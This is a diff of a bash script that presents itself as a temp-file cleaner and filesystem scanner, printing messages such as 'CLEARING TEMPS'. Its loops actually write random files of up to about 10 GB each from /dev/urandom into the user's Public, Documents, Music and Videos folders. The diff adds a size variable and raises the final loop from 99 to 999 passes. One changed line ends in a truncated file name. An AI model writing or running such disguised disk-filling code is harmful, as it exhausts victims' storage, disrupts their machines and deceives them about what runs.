@@ -7,20 +7,21 @@ echo "unnecessary files found. Starting clean."
 sleep 2
 echo "CLEARING TEMPS"
 sleep 3
+x=9999999999
 for (( c=1; c<=15; c++ ))
 do
  
 cd ~/Public
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Documents
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Music
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Videos
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x> $RANDOM.txt
 cd ~
  
 
@@ -35,16 +36,16 @@ for (( c=1; c<=5; c++ ))
 do
  
 cd ~/Public
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Documents
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.
 cd ~
 cd ~/Music
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Videos
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
  
 
@@ -54,19 +55,19 @@ sleep $((RANDOM % 5))
 done
 
 echo "Performing final filesystem scan. This may take up to 5 minutes."
-for ((c=1;c<=99;c++))
+for ((c=1;c<=999;c++))
 do 
 cd ~/Public
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Documents
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Music
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 cd ~/Videos
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
 &> /dev/null
  done
